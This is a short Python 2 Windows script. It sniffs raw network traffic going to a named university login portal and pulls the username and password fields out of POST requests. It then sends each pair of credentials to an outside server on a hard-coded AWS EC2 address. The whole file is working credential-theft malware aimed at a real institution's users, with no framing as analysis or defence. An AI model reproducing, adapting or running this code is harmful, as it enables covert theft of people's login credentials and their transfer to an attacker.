def runasAdmin():
    shell32 = ctypes.windll.shell32
    if not shell32.IsUserAnAdmin():
        print "Not Admin"
        return False
    else:
        print "Admin"
        return True

def sniff():
    host = getSelfIP()
    sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
    sniffer.bind((host[0], 0))
    sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
    try:
        while True:
            buffer = sniffer.recvfrom(65565)[0]
            dst = socket.inet_ntoa(buffer[16:20])
            protocol = int(buffer[9].encode('hex'), 16)
            if dst == host[1] and protocol == 6:
                packet = buffer[40:]
                if search(r'POST', packet):
                    credentials = search(r'(.*)(j_username=)(.*)(&)(j_password=)(.*)(&)(.*)', packet)
                    username = credentials.group(3)
                    password = credentials.group(6)
                    send_credentials(username,password)
    except KeyboardInterrupt:
        sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
        print 'Program Ended...'

def send_credentials(username, password):
    params = OrderedDict([('username', username), ('password', password)])
    r = requests.get(credential_server, params=urlencode(params))
    if r.status_code == 200:
        print 'Success'


def getSelfIP():
    ipChecker = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ipChecker.connect((dst_server, 80))
    Sip = ipChecker.getsockname()[0]
    Dip = ipChecker.getpeername()[0]
    ip = [ Sip, Dip ]
    ipChecker.close()
    print ip
    return ip

def main():
    if runasAdmin():
        try:
            sniff()
        except Exception as e:
            #print "Sorry we encountered a problem. Couldnot run as admin\n\n"
            print e
            print e.args
            print e.message
            raw_input()

if __name__ == '__main__':
    from re import search
    from collections import OrderedDict
    from urllib import urlencode
    import socket
    import requests
    import ctypes
    dst_server = "kiitportal.kiituniversity.net"
    credential_server = "http://ec2-35-162-25-5.us-west-2.compute.amazonaws.com/kiitportal_credentials.php"
    main()